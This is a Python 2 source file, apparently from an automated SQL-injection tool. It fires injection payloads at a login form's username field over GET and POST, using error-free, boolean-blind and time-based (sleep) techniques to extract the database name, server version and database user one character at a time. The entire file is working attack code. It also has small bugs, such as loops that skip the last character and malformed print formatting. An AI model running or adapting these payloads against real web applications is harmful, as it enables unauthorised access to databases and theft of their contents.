#!/usr/bin/env python
# -*- coding:utf-8 -*-
from lib.log import logger
from config import BaseConfig
from config import UnpackFunction
from data import DataProcess

__author__ = "LoRexxar"


class SqliTest(BaseConfig):
    def __init__(self):
        BaseConfig.__init__(self)

    def test(self, output=1):
        # global conf
        if self.sqlirequest == "GET":
            payload = "username = ddog||1%23&passwd=ddog123&submit=Log+In"
            r = self.Data.GetData(payload)

        elif self.sqlirequest == "POST":
            payload = {"username": "a||1'#", "password": "a"}
            r = self.Data.PostData(payload)
        if self.len != 0:
            logger.info("Set the parameters of the self.len...")
            self.len = len(r)
        if output == 1:
            print UnpackFunction(r)

    # 获取当前库名
    def get_now_database(self):
        database = ""

        if self.sqlirequest == "GET":
            logger.info("The sqlirequest is %s, start sqli database..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注database长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
                payload = "username=ddog123' && select length(database()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                database_len = int(UnpackFunction(r))
                logger.info("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len

                # 然后注database
                # payload = {"username": "ddog' or select database()%23", "password": "a"}
                payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                database = UnpackFunction(r)
                logger.info("Database sqli success...The database is %s" % database)
                print "[*] database: " + database
                self.database = database

            elif self.sqlimethod == "build":
                # 先注database长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start database length sqli...")
                # logger.info("Start database length sqli payload Queue build...")
                for i in range(1, 30):
                    payload = "username=ddog123' && (select length(database())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        database_len = i
                        break

                logger.info("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.info("Database length sqli payload Queue build success...")

                # 再注database
                logger.info("Start database sqli...")
                for i in range(1, database_len):
                    for j in range(30, 130):
                        payload = "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            database += chr(int(j))
                            break
                logger.info("Database sqli success...The database is %s" % database)
                print "[*] database: %s" + database
                self.database = database

            elif self.sqlimethod == "time":
                # 先注database长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start database length sqli...")
                for i in range(1, 30):
                    payload = "username=ddog123' && SELECT if((select length(database()))>" + repr(
                        i) + ",sleep("+self.time+"),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        database_len = i
                        break

                logger.info("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.info("Database length sqli payload Queue build success...")

                # 再注database
                logger.info("Start database sqli...")
                for i in range(1, database_len):
                    for j in range(30, 130):
                        payload = "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
                            j) + ",sleep("+self.time+"),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            database += chr(int(j))
                            break
                logger.info("Database sqli success...The database is %s" % database)
                print "[*] database: %s" + database
                self.database = database

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.info("The sqlirequest is %s, start sqli database..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注database长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                payload = {"username": "ddog' or select length(database())%23", "password": "a"}
                # payload = "username=ddog123' && select length(database()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                database_len = int(UnpackFunction(r))
                print "[*] database_len: %d" % database_len
                # 然后注database
                payload = {"username": "ddog' or select database()%23", "password": "a"}
                # payload = "username=ddog123' && select database() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                database = UnpackFunction(r)
                print "[*] database: " + database
                self.database = database

            elif self.sqlimethod == "build":
                # 先注database长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start database length sqli...")
                # logger.info("Start database length sqli payload Queue build...")
                for i in range(1, 30):
                    payload = {"username":"ddog123' && (select length(database())) > " + repr(i) + " && '1'='1", "passwd": "ddog123"}
                    # payload = "username=ddog123' && (select length(database())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        database_len = i
                        break

                logger.info("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.info("Database length sqli payload Queue build success...")

                # 再注database
                logger.info("Start database sqli...")
                for i in range(1, database_len):
                    for j in range(30, 130):
                        payload = {"username": "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1", "passwd": "ddog123"}
                        # payload = "ddog123'&&ascii(mid(database()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            database += chr(int(j))
                            break
                logger.info("Database sqli success...The database is %s" % database)
                print "[*] database: %s" + database
                self.database = database

            elif self.sqlimethod == "time":
                # 先注database长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start database length sqli...")
                for i in range(1, 30):
                    payload = {"username": "username=ddog123' && SELECT if((select length(database()))>" + repr(
                        i) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
                    # payload = "username=ddog123' && SELECT if((select length(database()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        database_len = i
                        break

                logger.info("Database length sqli success...The database_len is %d..." % database_len)
                print "[*] database_len: %d" % database_len
                # logger.info("Database length sqli payload Queue build success...")

                # 再注database
                logger.info("Start database sqli...")
                for i in range(1, database_len):
                    for j in range(30, 130):
                        payload = {"username": "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(
                            j) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
                        # payload = "ddog123'&& SELECT if((select ascii(mid(database()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            database += chr(int(j))
                            break
                logger.info("Database sqli success...The database is %s" % database)
                print "[*] database: %s" + database
                self.database = database

    # version
    def get_version(self):

        version = ""

        if self.sqlirequest == "GET":
            logger.info("The sqlirequest is %s, start sqli version..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注version长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                # payload = {"username": "ddog' or select length(database())%23", "password": "a"}
                payload = "username=ddog123' && select length(version()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                version_len = int(UnpackFunction(r))
                print "[*] version_len: %d" % version_len
                # 然后注version
                # payload = {"username": "ddog' or select version()%23", "password": "a"}
                payload = "username=ddog123' && select version() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                version = UnpackFunction(r)
                print "[*] version: " + version

            elif self.sqlimethod == "build":
                # 先注version长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start version length sqli...")
                # logger.info("Start version length sqli payload Queue build...")
                for i in range(1, 30):
                    payload = "username=ddog123' && (select length(version())) > " + repr(
                        i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        version_len = i
                        break

                logger.info("Database length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.info("Version length sqli payload Queue build success...")

                # 再注version
                logger.info("Start version sqli...")
                for i in range(1, version_len):
                    for j in range(30, 130):
                        payload = "ddog123'&&ascii(mid(version()," + repr(i) + ",1))>" + repr(
                            j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            version += chr(int(j))
                            break
                logger.info("version sqli success...The database is %s" % version)
                print "[*] version: %s" + version

            elif self.sqlimethod == "time":
                # 先注version长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start version length sqli...")
                for i in range(1, 30):
                    payload = "username=ddog123' && SELECT if((select length(version()))>" + repr(
                        i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        version_len = i
                        break

                logger.info("Version length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.info("Database length sqli payload Queue build success...")

                # 再注version
                logger.info("Start version sqli...")
                for i in range(1, version_len):
                    for j in range(30, 130):
                        payload = "ddog123'&& SELECT if((select ascii(mid(version()," + repr(i) + ",1)))>" + repr(
                            j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            version += chr(int(j))
                            break
                logger.info("Version sqli success...The version is %s" % version)
                print "[*] version: %s" + version

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.info("The sqlirequest is %s, start sqli version..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注version长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                payload = {"username": "ddog' or select length(version())%23", "password": "a"}
                # payload = "username=ddog123' && select length(version()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                version_len = int(UnpackFunction(r))
                print "[*] version_len: %d" % version_len
                # 然后注version
                payload = {"username": "ddog' or select version()%23", "password": "a"}
                # payload = "username=ddog123' && select version() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                version = UnpackFunction(r)
                print "[*] version: " + version

            elif self.sqlimethod == "build":
                # 先注version长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start version length sqli...")
                # logger.info("Start version length sqli payload Queue build...")
                for i in range(1, 30):
                    payload = {"username": "ddog123' && (select length(version())) > " + repr(i) + " && '1'='1",
                               "passwd": "ddog123"}
                    # payload = "username=ddog123' && (select length(version())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        version_len = i
                        break

                logger.info("Version length sqli success...The database_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.info("Version length sqli payload Queue build success...")

                # 再注version
                logger.info("Start version sqli...")
                for i in range(1, version_len):
                    for j in range(30, 130):
                        payload = {
                            "username": "ddog123'&&ascii(mid(version()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1",
                            "passwd": "ddog123"}
                        # payload = "ddog123'&&ascii(mid(version()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            version += chr(int(j))
                            break
                logger.info("Version sqli success...The version is %s" % version)
                print "[*] version: %s" + version

            elif self.sqlimethod == "time":
                # 先注database长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start version length sqli...")
                for i in range(1, 30):
                    payload = {"username": "username=ddog123' && SELECT if((select length(version()))>" + repr(
                        i) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
                    # payload = "username=ddog123' && SELECT if((select length(version()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        version_len = i
                        break

                logger.info("Version length sqli success...The version_len is %d..." % version_len)
                print "[*] version_len: %d" % version_len
                # logger.info("Version length sqli payload Queue build success...")

                # 再注database
                logger.info("Start version sqli...")
                for i in range(1, version_len):
                    for j in range(30, 130):
                        payload = {"username": "ddog123'&& SELECT if((select ascii(mid(version()," + repr(
                            i) + ",1)))>" + repr(
                            j) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
                        # payload = "ddog123'&& SELECT if((select ascii(mid(version()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            version += chr(int(j))
                            break
                logger.info("Version sqli success...The version is %s" % version)
                print "[*] version: %s" + version

    # user
    def get_user(self):

        user = ""

        if self.sqlirequest == "GET":
            logger.info("The sqlirequest is %s, start sqli user..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注user长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                # payload = {"username": "ddog' or select length(user())%23", "password": "a"}
                payload = "username=ddog123' && select length(user()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                user_len = int(UnpackFunction(r))
                print "[*] user_len: %d" % user_len
                # 然后注user
                # payload = {"username": "ddog' or select user()%23", "password": "a"}
                payload = "username=ddog123' && select user() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.GetData(payload)
                user = UnpackFunction(r)
                print "[*] user: " + user

            elif self.sqlimethod == "build":
                # 先注user长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start user length sqli...")
                # logger.info("Start user length sqli payload Queue build...")
                for i in range(1, 30):
                    payload = "username=ddog123' && (select length(user())) > " + repr(
                        i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetBuildData(payload, self.len) == 0:
                        user_len = i
                        break

                logger.info("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.info("user length sqli payload Queue build success...")

                # 再注user
                logger.info("Start user sqli...")
                for i in range(1, user_len):
                    for j in range(30, 130):
                        payload = "ddog123'&&ascii(mid(user()," + repr(i) + ",1))>" + repr(
                            j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetBuildData(payload, self.len) == 0:
                            user += chr(int(j))
                            break
                logger.info("version sqli success...The user is %s" % user)
                print "[*] user: %s" + user

            elif self.sqlimethod == "time":
                # 先注user长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start user length sqli...")
                for i in range(1, 30):
                    payload = "username=ddog123' && SELECT if((select length(user()))>" + repr(
                        i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.GetTimeData(payload, self.time) == 0:
                        user_len = i
                        break

                logger.info("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.info("user length sqli payload Queue build success...")

                # 再注user
                logger.info("Start user sqli...")
                for i in range(1, user_len):
                    for j in range(30, 130):
                        payload = "ddog123'&& SELECT if((select ascii(mid(user()," + repr(i) + ",1)))>" + repr(
                            j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.GetTimeData(payload, self.time) == 0:
                            user += chr(int(j))
                            break
                logger.info("user sqli success...The user is %s" % user)
                print "[*] user: %s" + user

        # 然后是post
        elif self.sqlirequest == "POST":
            logger.info("The sqlirequest is %s, start sqli version..." % self.sqlirequest)
            if self.sqlimethod == "normal":
                # 先注user长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                payload = {"username": "ddog' or select length(user())%23", "password": "a"}
                # payload = "username=ddog123' && select length(user()) && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                user_len = int(UnpackFunction(r))
                print "[*] user_len: %d" % user_len
                # 然后注user
                payload = {"username": "ddog' or select user()%23", "password": "a"}
                # payload = "username=ddog123' && select user() && '1'='1&passwd=ddog123&submit=Log+In"
                r = self.Data.PostData(payload)
                user = UnpackFunction(r)
                print "[*] user: " + user

            elif self.sqlimethod == "build":
                # 先注user长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start user length sqli...")
                # logger.info("Start user length sqli payload Queue build...")
                for i in range(1, 30):
                    payload = {"username": "ddog123' && (select length(user())) > " + repr(i) + " && '1'='1",
                               "passwd": "ddog123"}
                    # payload = "username=ddog123' && (select length(user())) > " + repr(i) + " && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostBuildData(payload, self.len) == 0:
                        user_len = i
                        break

                logger.info("User length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.info("user length sqli payload Queue build success...")

                # 再注user
                logger.info("Start user sqli...")
                for i in range(1, user_len):
                    for j in range(30, 130):
                        payload = {
                            "username": "ddog123'&&ascii(mid(user()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1",
                            "passwd": "ddog123"}
                        # payload = "ddog123'&&ascii(mid(user()," + repr(i) + ",1))>" + repr(j) + "&&'1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            user += chr(int(j))
                            break
                logger.info("User sqli success...The user is %s" % user)
                print "[*] user: %s" + user

            elif self.sqlimethod == "time":
                # 先注user长度
                logger.info("The sqlimethod is %s..." % self.sqlimethod)
                logger.info("Start user length sqli...")
                for i in range(1, 30):
                    payload = {"username": "username=ddog123' && SELECT if((select length(user()))>" + repr(
                        i) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
                    # payload = "username=ddog123' && SELECT if((select length(user()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                    if self.Data.PostTimeData(payload, self.time) == 0:
                        user_len = i
                        break

                logger.info("user length sqli success...The user_len is %d..." % user_len)
                print "[*] user_len: %d" % user_len
                # logger.info("user length sqli payload Queue build success...")

                # 再注user
                logger.info("Start user sqli...")
                for i in range(1, user_len):
                    for j in range(30, 130):
                        payload = {"username": "ddog123'&& SELECT if((select ascii(mid(user()," + repr(
                            i) + ",1)))>" + repr(
                            j) + ",sleep(" + self.time + "),0) && '1'='1", "passwd": "ddog123"}
                        # payload = "ddog123'&& SELECT if((select ascii(mid(user()," + repr(i) + ",1)))>" + repr(j) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                        if self.Data.PostTimeData(payload, self.time) == 0:
                            user += chr(int(j))
                            break
                logger.info("User sqli success...The user is %s" % user)
                print "[*] user: %s" + user
